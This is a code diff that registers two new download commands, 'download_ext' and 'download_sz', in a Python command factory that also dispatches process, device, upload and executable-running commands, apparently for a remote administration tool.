@@ -17,6 +17,8 @@ from command.command_kill_process import CommandKillProcess
 from command.command_list_process import CommandListProcess
 from command.command_list_devices import CommandListDevices
 from command.command_download import CommandDownload
+from command.command_download_ext import CommandDownloadExt
+from command.command_download_sz import CommandDownloadSz
 from command.command_upload import CommandUpload
 from command.command_run_exe import CommandRunExe
 from command.command_run_ps import CommandRunPS
@@ -49,6 +51,8 @@ class CommandFactory:
         cls._commands.append("list_process")
         cls._commands.append("list_devices")
         cls._commands.append("download")
+        cls._commands.append("download_ext")
+        cls._commands.append("download_sz")
         cls._commands.append("upload")
         cls._commands.append("run_exe")
         cls._commands.append("run_ps")
@@ -93,6 +97,10 @@ class CommandFactory:
                 return CommandListDevices()
             elif name == "download":
                 return CommandDownload()
+            elif name == "download_ext":
+                return CommandDownloadExt()
+            elif name == "download_sz":
+                return CommandDownloadSz()
             elif name == "upload":
                 return CommandUpload()
             elif name == "run_exe":
